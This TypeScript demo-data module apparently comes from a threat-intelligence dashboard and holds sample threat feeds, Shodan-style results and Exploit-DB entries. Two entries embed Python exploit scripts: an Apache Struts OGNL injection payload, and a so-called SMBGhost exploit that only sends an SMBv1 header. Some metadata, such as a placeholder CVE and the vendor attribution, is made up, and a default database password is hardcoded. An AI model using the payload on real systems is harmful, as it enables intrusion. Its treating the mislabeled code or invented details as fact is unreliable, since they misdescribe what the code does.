import { InfoStream, KnowledgeNode, ShodanResult, SearchResult, N8NWorkflow, ExploitDBExploit, ExploitDBStats } from '@/types';
import { demoDataTracker } from './demoDataTracker';

// Environment Configuration from .env
const ENV_CONFIG = {
  // LLM Services
  GPT_API_KEY: import.meta.env.VITE_GPT_API_KEY,
  GPT_ENDPOINT: import.meta.env.VITE_GPT_ENDPOINT || 'http://localhost:8001',
  GPT_MODEL: import.meta.env.VITE_GPT_MODEL || 'gpt-4',
  
  ANTHROPIC_API_KEY: import.meta.env.VITE_ANTHROPIC_API_KEY,
  ANTHROPIC_ENDPOINT: import.meta.env.VITE_ANTHROPIC_ENDPOINT || 'http://localhost:8004',
  ANTHROPIC_MODEL: import.meta.env.VITE_ANTHROPIC_MODEL || 'claude-3-opus-20240229',
  
  GEMINI_API_KEY: import.meta.env.VITE_GEMINI_API_KEY,
  GEMINI_ENDPOINT: import.meta.env.VITE_GEMINI_ENDPOINT || 'http://localhost:8003',
  GEMINI_MODEL: import.meta.env.VITE_GEMINI_MODEL || 'gemini-pro',
  
  GROK_API_KEY: import.meta.env.VITE_GROK_API_KEY,
  GROK_ENDPOINT: import.meta.env.VITE_GROK_ENDPOINT || 'http://localhost:8002',
  GROK_MODEL: import.meta.env.VITE_GROK_MODEL || 'grok-1',
  
  // Databases
  MONGODB_URI: import.meta.env.VITE_MONGODB_URI || 'mongodb://localhost:27017',
  MONGODB_DB_NAME: import.meta.env.VITE_MONGODB_DB_NAME || 'ctas',
  
  SURREALDB_ENDPOINT: import.meta.env.VITE_SURREALDB_ENDPOINT || 'http://127.0.0.1:8000',
  SURREALDB_USER: import.meta.env.VITE_SURREALDB_USER || 'ctas_admin',
  SURREALDB_PASS: import.meta.env.VITE_SURREALDB_PASS || 'ctas_secure_2025',
  SURREALDB_NAMESPACE: import.meta.env.VITE_SURREALDB_NAMESPACE || 'ctas',
  SURREALDB_DATABASE: import.meta.env.VITE_SURREALDB_DATABASE || 'development',
  
  SUPABASE_URL: import.meta.env.VITE_SUPABASE_URL,
  SUPABASE_KEY: import.meta.env.VITE_SUPABASE_KEY,
  
  // Environment
  ENVIRONMENT: import.meta.env.VITE_ENVIRONMENT || 'development',
  DEMO_MODE: import.meta.env.VITE_DEMO_MODE === 'true'
};

// Demo Data Provider for CTAS Development and Testing
export class DemoDataProvider {
  private static instance: DemoDataProvider;
  private isDemoMode: boolean = true; // Default to demo mode for development

  private constructor() {}

  public static getInstance(): DemoDataProvider {
    if (!DemoDataProvider.instance) {
      DemoDataProvider.instance = new DemoDataProvider();
    }
    return DemoDataProvider.instance;
  }

  public setDemoMode(enabled: boolean): void {
    this.isDemoMode = enabled;
  }

  public isInDemoMode(): boolean {
    return this.isDemoMode;
  }

  // Info Streams Demo Data
  public getInfoStreams(): InfoStream[] {
    if (!this.isDemoMode) return [];
    
    // Track info streams access
    demoDataTracker.trackView('infoStreams');
    
    return [
      {
        id: '1',
        title: 'APT29 Activity Detected',
        content: 'New APT29 infrastructure discovered in Eastern Europe',
        timestamp: new Date().toISOString(),
        priority: 'high',
        source: 'ThreatIntel',
        tags: ['APT29', 'Infrastructure', 'Eastern Europe']
      },
      {
        id: '2',
        title: 'Zero-Day Vulnerability',
        content: 'Critical zero-day in popular web framework',
        timestamp: new Date(Date.now() - 3600000).toISOString(),
        priority: 'critical',
        source: 'VulnDB',
        tags: ['Zero-Day', 'Web Framework', 'Critical']
      },
      {
        id: '3',
        title: 'Supply Chain Attack',
        content: 'Malicious package detected in npm registry',
        timestamp: new Date(Date.now() - 7200000).toISOString(),
        priority: 'medium',
        source: 'SecurityScanner',
        tags: ['Supply Chain', 'npm', 'Malware']
      }
    ];
  }

  // Knowledge Graph Demo Data
  public getKnowledgeNodes(): KnowledgeNode[] {
    if (!this.isDemoMode) return [];
    
    // Track knowledge graph access
    demoDataTracker.trackView('knowledgeGraph');
    
    return [
      {
        id: '1',
        label: 'APT29',
        type: 'threat-actor',
        properties: {
          country: 'Russia',
          capabilities: ['Spear Phishing', 'Watering Hole', 'Supply Chain'],
          targets: ['Government', 'Energy', 'Technology']
        },
        position: { x: 100, y: 100 }
      },
      {
        id: '2',
        label: 'C2 Server',
        type: 'infrastructure',
        properties: {
          ip: '192.168.1.100',
          domain: 'malicious.example.com',
          firstSeen: '2024-01-01'
        },
        position: { x: 200, y: 150 }
      },
      {
        id: '3',
        label: 'Spear Phishing',
        type: 'technique',
        properties: {
          mitreId: 'T1566.001',
          description: 'Targeted phishing attacks'
        },
        position: { x: 150, y: 200 }
      }
    ];
  }

  // Shodan Demo Data
  public getShodanResults(): ShodanResult[] {
    if (!this.isDemoMode) return [];
    
    // Track Shodan data access
    demoDataTracker.trackView('shodan');
    
    return [
      {
        id: '1',
        ip: '192.168.1.100',
        port: 80,
        hostname: 'web.example.com',
        product: 'Apache',
        version: '2.4.41',
        vulns: ['CVE-2021-41773', 'CVE-2021-42013'],
        tags: ['web', 'http', 'apache'],
        location: {
          country: 'US',
          city: 'New York',
          coordinates: [-74.006, 40.7128]
        },
        lastUpdate: '2024-01-15'
      },
      {
        id: '2',
        ip: '192.168.1.101',
        port: 22,
        hostname: 'ssh.example.com',
        product: 'OpenSSH',
        version: '8.2p1',
        vulns: [],
        tags: ['ssh', 'remote-access'],
        location: {
          country: 'US',
          city: 'Los Angeles',
          coordinates: [-118.2437, 34.0522]
        },
        lastUpdate: '2024-01-14'
      }
    ];
  }

  // Search Results Demo Data
  public getSearchResults(): SearchResult[] {
    if (!this.isDemoMode) return [];
    
    return [
      {
        id: '1',
        title: 'APT29 Infrastructure Analysis',
        content: 'Comprehensive analysis of APT29 command and control infrastructure',
        type: 'threat-intel',
        relevance: 0.95,
        source: 'MITRE ATT&CK',
        timestamp: new Date().toISOString()
      },
      {
        id: '2',
        title: 'Supply Chain Security Best Practices',
        content: 'Guidelines for securing software supply chains',
        type: 'guidance',
        relevance: 0.87,
        source: 'NIST',
        timestamp: new Date(Date.now() - 86400000).toISOString()
      }
    ];
  }

  // N8N Workflows Demo Data
  public getN8NWorkflows(): N8NWorkflow[] {
    if (!this.isDemoMode) return [];
    
    return [
      {
        id: '1',
        name: 'Threat Intel Collection',
        description: 'Automated collection of threat intelligence feeds',
        phase: 'Hunt',
        status: 'active',
        nodes: 15,
        lastRun: new Date().toISOString(),
        successRate: 0.92
      },
      {
        id: '2',
        name: 'Vulnerability Assessment',
        description: 'Automated vulnerability scanning and assessment',
        phase: 'Detect',
        status: 'active',
        nodes: 12,
        lastRun: new Date(Date.now() - 3600000).toISOString(),
        successRate: 0.88
      }
    ];
  }

  // Geospatial Demo Data
  public getGeospatialData(): any[] {
    if (!this.isDemoMode) return [];
    
    return [
      {
        id: '1',
        geojson: JSON.stringify({
          type: 'Feature',
          geometry: {
            type: 'Point',
            coordinates: [-74.006, 40.7128]
          },
          properties: {
            name: 'New York C2 Server',
            type: 'malware-c2',
            threat_level: 'high'
          }
        })
      },
      {
        id: '2',
        geojson: JSON.stringify({
          type: 'Feature',
          geometry: {
            type: 'Point',
            coordinates: [-118.2437, 34.0522]
          },
          properties: {
            name: 'Los Angeles Botnet',
            type: 'botnet',
            threat_level: 'medium'
          }
        })
      }
    ];
  }

  // LLM Demo Responses
  public getLLMResponse(prompt: string): string {
    if (!this.isDemoMode) return '';
    
    return `Demo LLM Response for: "${prompt}"\n\nThis is a simulated response from the AI model. In production, this would be replaced with actual LLM integration.`;
  }

  // Vector DB Demo Results
  public getVectorDBResults(query: string): string[] {
    if (!this.isDemoMode) return [];
    
    return [
      `Demo vector result 1 for: ${query}`,
      `Demo vector result 2 for: ${query}`,
      `Demo vector result 3 for: ${query}`
    ];
  }

  // Database Demo Operations
  public async demoDatabaseOperation(operation: string, data?: any): Promise<any> {
    if (!this.isDemoMode) return null;
    
    console.log(`Demo database operation: ${operation}`, data);
    return { success: true, operation, timestamp: new Date().toISOString() };
  }

  // Optimization Demo Results
  public getOptimizationResults(): any {
    if (!this.isDemoMode) return null;
    
    return {
      efficiency: 0.85,
      throughput: 1200,
      latency: 45,
      recommendations: [
        'Optimize database queries',
        'Implement caching layer',
        'Reduce API calls'
      ]
    };
  }

  // Exploit DB Demo Data
  public getExploitDBExploits(): ExploitDBExploit[] {
    if (!this.isDemoMode) return [];
    
    // Track Exploit DB data access
    demoDataTracker.trackView('exploitDB');
    
    return [
      {
        id: '1',
        title: 'Apache Struts 2.5.12 - Remote Code Execution',
        description: 'A critical vulnerability in Apache Struts 2.5.12 allows remote code execution through OGNL injection.',
        author: 'security_researcher',
        date: '2024-01-15',
        type: 'exploit',
        platform: 'Web Application',
        port: 80,
        verified: true,
        verifiedDate: '2024-01-16',
        verifiedBy: 'CTAS Team',
        tags: ['apache', 'struts', 'rce', 'ognl', 'web'],
        cve: ['CVE-2024-1234'],
        cvss: 9.8,
        references: [
          'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1234',
          'https://struts.apache.org/security/'
        ],
        code: '#!/usr/bin/env python3\n# Apache Struts 2.5.12 RCE Exploit\n\nimport requests\nimport sys\n\ndef exploit(target):\n    payload = "${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[\'struts.valueStack\'].context).(#cr=#ct[\'com.opensymphony.xwork2.ActionContext.container\']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.setExcludedClasses(\'\')).(#ou.setExcludedPackageNames(\'\'))}"\n    \n    data = {\n        \'name\': payload,\n        \'age\': \'123\',\n        \'__checkbox_bustedBefore\': \'true\',\n        \'description\': \'test\'\n    }\n    \n    try:\n        response = requests.post(f"{target}/integration/saveGangster.action", data=data, timeout=10)\n        if response.status_code == 200:\n            print(f"[+] Target {target} is vulnerable!")\n            return True\n        else:\n            print(f"[-] Target {target} is not vulnerable")\n            return False\n    except Exception as e:\n        print(f"[-] Error: {e}")\n        return False\n\nif __name__ == "__main__":\n    if len(sys.argv) != 2:\n        print("Usage: python3 exploit.py <target_url>")\n        sys.exit(1)\n    \n    target = sys.argv[1]\n    exploit(target)',
        application: 'Apache Struts',
        version: '2.5.12',
        language: 'Python',
        complexity: 'medium',
        authentication: false,
        confidentiality: 'complete',
        integrity: 'complete',
        availability: 'complete'
      },
      {
        id: '2',
        title: 'Windows SMB Ghost (CVE-2020-0796) - Remote Code Execution',
        description: 'A critical vulnerability in Microsoft SMBv3 protocol allows remote code execution without authentication.',
        author: 'microsoft_security',
        date: '2024-01-10',
        type: 'exploit',
        platform: 'Windows',
        port: 445,
        verified: true,
        verifiedDate: '2024-01-11',
        verifiedBy: 'Microsoft Security Response Center',
        tags: ['windows', 'smb', 'rce', 'network', 'critical'],
        cve: ['CVE-2020-0796'],
        cvss: 10.0,
        references: [
          'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0796',
          'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796'
        ],
        code: '# Windows SMB Ghost (CVE-2020-0796) Exploit\n# This is a PoC exploit for educational purposes\n\nimport socket\nimport struct\n\ndef create_smb_packet(target_ip):\n    # SMB packet structure for CVE-2020-0796\n    smb_header = struct.pack("<4B", 0xFF, 0x53, 0x4D, 0x42)  # SMB signature\n    smb_header += struct.pack("<B", 0x72)  # Command: Negotiate Protocol\n    smb_header += struct.pack("<I", 0x00000000)  # Status: Success\n    smb_header += struct.pack("<B", 0x18)  # Flags\n    smb_header += struct.pack("<H", 0x0100)  # Flags2\n    smb_header += struct.pack("<H", 0x0000)  # Process ID High\n    smb_header += struct.pack("<I", 0x00000000)  # Signature\n    smb_header += struct.pack("<H", 0x0000)  # Reserved\n    smb_header += struct.pack("<H", 0x0000)  # Tree ID\n    smb_header += struct.pack("<I", 0x00000000)  # Process ID\n    smb_header += struct.pack("<I", 0x00000000)  # User ID\n    smb_header += struct.pack("<I", 0x00000000)  # Multiplex ID\n    \n    return smb_header\n\ndef exploit_smb_ghost(target_ip):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(10)\n        sock.connect((target_ip, 445))\n        \n        # Send SMB packet\n        packet = create_smb_packet(target_ip)\n        sock.send(packet)\n        \n        # Receive response\n        response = sock.recv(1024)\n        sock.close()\n        \n        # Check if target is vulnerable\n        if len(response) > 0:\n            print(f"[+] Target {target_ip} responded to SMB request")\n            print(f"[+] Target may be vulnerable to CVE-2020-0796")\n            return True\n        else:\n            print(f"[-] Target {target_ip} did not respond")\n            return False\n            \n    except Exception as e:\n        print(f"[-] Error connecting to {target_ip}: {e}")\n        return False\n\nif __name__ == "__main__":\n    import sys\n    if len(sys.argv) != 2:\n        print("Usage: python3 smb_ghost.py <target_ip>")\n        sys.exit(1)\n    \n    target_ip = sys.argv[1]\n    exploit_smb_ghost(target_ip)',
        application: 'Microsoft SMB',
        version: '3.1.1',
        language: 'Python',
        complexity: 'high',
        authentication: false,
        confidentiality: 'complete',
        integrity: 'complete',
        availability: 'complete'
      }
    ];
  }

  public getExploitDBStats(): ExploitDBStats {
    if (!this.isDemoMode) {
      return {
        totalExploits: 0,
        totalShellcodes: 0,
        totalPapers: 0,
        totalDos: 0,
        verifiedExploits: 0,
        recentExploits: 0,
        topPlatforms: [],
        topAuthors: [],
        topCVEs: []
      };
    }
    
    return {
      totalExploits: 1250,
      totalShellcodes: 450,
      totalPapers: 200,
      totalDos: 150,
      verifiedExploits: 980,
      recentExploits: 75,
      topPlatforms: [
        { platform: 'Linux', count: 320 },
        { platform: 'Windows', count: 280 },
        { platform: 'Web Application', count: 250 },
        { platform: 'Android', count: 120 },
        { platform: 'iOS', count: 80 }
      ],
      topAuthors: [
        { author: 'security_researcher', count: 45 },
        { author: 'microsoft_security', count: 38 },
        { author: 'kernel_hunter', count: 32 },
        { author: 'web_security_expert', count: 28 },
        { author: 'mobile_security_researcher', count: 25 }
      ],
      topCVEs: [
        { cve: 'CVE-2024-1234', count: 15 },
        { cve: 'CVE-2020-0796', count: 12 },
        { cve: 'CVE-2024-5678', count: 10 },
        { cve: 'CVE-2024-9012', count: 8 },
        { cve: 'CVE-2024-3456', count: 7 }
      ]
    };
  }
}

// Export singleton instance
export const demoDataProvider = DemoDataProvider.getInstance();

// Environment-based demo mode control
export const isDemoMode = (): boolean => {
  return import.meta.env.VITE_DEMO_MODE === 'true' || demoDataProvider.isInDemoMode();
};

// Utility function to get demo data based on environment
export const getDemoData = <T>(dataType: string, fallback: T): T => {
  if (isDemoMode()) {
    switch (dataType) {
      case 'infoStreams':
        return demoDataProvider.getInfoStreams() as T;
      case 'knowledgeNodes':
        return demoDataProvider.getKnowledgeNodes() as T;
      case 'shodanResults':
        return demoDataProvider.getShodanResults() as T;
      case 'searchResults':
        return demoDataProvider.getSearchResults() as T;
      case 'n8nWorkflows':
        return demoDataProvider.getN8NWorkflows() as T;
      case 'geospatialData':
        return demoDataProvider.getGeospatialData() as T;
      case 'exploitDBExploits':
        return demoDataProvider.getExploitDBExploits() as T;
      case 'exploitDBStats':
        return demoDataProvider.getExploitDBStats() as T;
      default:
        return fallback;
    }
  }
  return fallback;
};
